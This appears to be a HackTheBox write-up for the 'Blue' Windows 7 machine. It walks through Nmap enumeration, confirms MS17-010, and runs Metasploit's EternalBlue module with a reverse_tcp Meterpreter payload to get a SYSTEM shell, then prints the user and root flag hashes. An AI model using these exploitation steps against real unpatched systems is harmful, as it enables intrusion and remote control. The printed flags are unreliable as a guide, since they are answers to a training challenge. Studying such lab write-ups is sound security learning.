HackTheBox: Blue

HackTheBox Windows Easy EternalBlue MS17-010

Machine Overview

Blue is a Windows 7 Professional SP1 machine vulnerable to the infamous MS17-010 (EternalBlue) exploit. This walkthrough demonstrates how to exploit this vulnerability using Metasploit to gain SYSTEM-level access and retrieve both user and root flags.

Step 1: Service Enumeration

Initial Nmap scan reveals open SMB-related ports indicating Windows services:

[msf] >> db_nmap blue.htb
[*] Nmap scan report for blue.htb (10.10.10.40)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
...

Version scan reveals detailed OS information:

[msf] >> db_nmap -sVC -p135,139,445 blue.htb
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
Host script results:
| smb-os-discovery: Windows 7 Professional 7601 Service Pack 1
| smb2-security-mode: Message signing enabled but not required
|_smb-security-mode: message_signing: disabled (dangerous, but default)

The presence of SMBv1 and Windows 7 SP1 suggests vulnerability to MS17-010.

Step 2: Vulnerability Identification

Searching for EternalBlue modules in Metasploit:

[msf] >> search eternalblue

Matching Modules
================
  #  Name                                              Disclosure Date
  0  exploit/windows/smb/ms17_010_eternalblue         2017-03-14
  1  exploit/windows/smb/ms17_010_psexec              2017-03-14
  2  auxiliary/scanner/smb/smb_ms17_010               normal

Use the auxiliary scanner to confirm vulnerability:

[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64

Step 3: Exploit Configuration

Configure the EternalBlue exploit module:

[msf] >> use exploit/windows/smb/ms17_010_eternalblue
[msf] >> set RHOSTS blue.htb
RHOSTS => blue.htb
[msf] >> set LHOST tun0
LHOST => 10.10.14.5
[msf] >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
[msf] >> run

Step 4: Exploitation & Shell

Successful exploitation grants a Meterpreter session with SYSTEM privileges:

[*] Started reverse TCP handler on 10.10.14.5:4444
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully!
[*] Meterpreter session 2 opened

(Meterpreter) > getuid
Server username: NT AUTHORITY\SYSTEM

(Meterpreter) > shell
C:\Windows\system32>

Step 5: Capture Flags

Navigate to user directory to capture the user flag:

C:\> cd Users/haris/Desktop
C:\Users\haris\Desktop> dir
user.txt

C:\Users\haris\Desktop> cat user.txt
4eff82102d043d4de96465fbb30a633b

Navigate to Administrator's Desktop for the root flag:

C:\> cd Users/Administrator/Desktop
C:\Users\Administrator\Desktop> dir
root.txt

C:\Users\Administrator\Desktop> cat root.txt
58a3530431d8b3bf133758fadcadadf2

Key Takeaways

  • MS17-010 (EternalBlue) - Critical SMB vulnerability in Windows 7/Server 2008
  • SMB Enumeration - Ports 139/445 indicate Windows file sharing services
  • Meterpreter - Powerful post-exploitation framework
  • SYSTEM Access - Highest privilege level on Windows

This machine demonstrates the devastating impact of unpatched SMB vulnerabilities. Always keep systems updated with security patches!
